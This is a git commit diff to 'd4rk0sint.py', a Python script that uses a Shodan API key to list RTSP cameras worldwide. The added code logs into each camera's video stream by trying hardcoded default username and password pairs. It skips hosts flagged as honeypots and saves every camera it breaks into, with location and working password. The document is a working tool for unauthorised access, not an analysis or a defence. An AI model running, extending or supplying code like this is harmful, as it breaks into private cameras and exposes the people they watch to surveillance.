5e9aa8a5c94b6dce772b1a0175bb6c8611a13fe4
command.Z3R0 <63407688+command-Z3R0@users.noreply.github.com>
2023-04-03 10:31:34 +0200

    Update d4rk0sint.py

--- d4rk0sint.py
+++ d4rk0sint.py
@@ -33,34 +33,79 @@ print(banner)
 parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras Around the World')
 parser.add_argument('apikey', metavar='ShodanAPIkey', type=str, help='Your Shodan API Key')
 parser.add_argument('-t', metavar='Threads', type=int, help='Threads to use', default=15)
+
+reverse = ""
 args = parser.parse_args()
 
-def warning(message): print(f'[{reverse}{warningcolour}!{fullreset}] {str(message)}')
-def success(message): print(f'[{reverse}{successcolour}!{fullreset}] {str(message)}')
-def info(message): print(f'[{reverse}{infocolour}!{fullreset}] {str(message)}')    
-def error(message): print(f'[{reverse}{errorcolour}!{fullreset}] {str(message)}')
+# Define las variables de color que se usan en las funciones de impresión
+fullreset = '\033[0m'
+errorcolour = '\033[91m'
+successcolour = '\033[92m'
+warningcolour = '\033[93m'
+infocolour = '\033[94m'  # Agrega esta línea para definir la variable infocolour
+
+def warning(message):
+    print(f'[{reverse}{warningcolour}!{fullreset}] {str(message)}')
+
+def success(message):
+    print(f'[{reverse}{successcolour}!{fullreset}] {str(message)}')
+
+def info(message):
+    print(f'[{reverse}{infocolour}!{fullreset}] {str(message)}')
+
+def error(message):
+    print(f'[{reverse}{errorcolour}!{fullreset}] {str(message)}')
+
 
 api = shodan.Shodan(args.apikey)
+
 try:
-    results = api.search("port:554 has_screenshot:true")
-    table = PrettyTable()
-    table.field_names = ["IP", "Hostname", "Organization", "OS", "Product", "Title"]
-
-    for result in results["matches"]:
-        ip = result["ip_str"]
-        hostname = result["hostnames"][0] if result["hostnames"] else "-"
-        organization = result["org"] if result["org"] else "-"
-        os = result["os"] if result["os"] else "-"
-        product = result["product"] if result["product"] else "-"
-        title = result["title"] if result["title"] else "-"
-
-        table.add_row([ip, hostname, organization, os, product, title])
-
-    print(f"[{successcolour}+{fullreset}] {len(results['matches'])} Results\n")
-    print(table)
-except shodan.APIError as e:
-    error(f'Error: {str(e)}')
+    info(f'Searching...')
+    results = api.search('rtsp')
+    success(str(len(results['matches'])) + ' Results')
+except shodan.exception.APIError as e:
+    error(e)
     sys.exit()
-    
+
+x = PrettyTable()
+x.field_names = ["IP", "Domain", "Country", "City"]
+
 for target in results['matches']:
-    targetdomain = successcolour + target["domains"][0] + fullreset if target["domains"] else ""
+    targetdomain = target.get("domains", [f'{errorcolour}N/A{fullreset}'])
+    if len(targetdomain) > 0:
+            targetdomain = targetdomain[0]
+    else:
+            targetdomain = f'{errorcolour}N/A{fullreset}'
+    x.add_row([target["ip_str"], targetdomain, target["location"].get("country_name", ""), target["location"].get("city", "")])
+
+print(x)
+
+info('Starting RTSP Probing in 5 Seconds...\n')
+sleep(5)
+defaultcredentials = ['admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin', 'admin:root']
+badcams = []
+allcams = []
+print_lock = threading.Lock()
+
+def tryrtsp(ip, creds):
+    cap = cv2.VideoCapture(f'rtsp://{creds}@{ip}')
+    ret, frame = cap.read()
+    if ret == True:
+        return creds
+    return False
+
+def rtspprobe(target):
+    info(f'Probing {target["ip_str"]}...')
+    if "honeypot" in str(target):
+        rtspresult = False
+    else:
+        for creds in defaultcredentials:
+            rtspresult = tryrtsp(target['ip_str'], creds)
+            if rtspresult != False:
+                badcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", ""), "pass":str(creds)})
+                break
+        else:
+            rtspresult = False
+    if rtspresult == False:
+        allcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", "")})
+
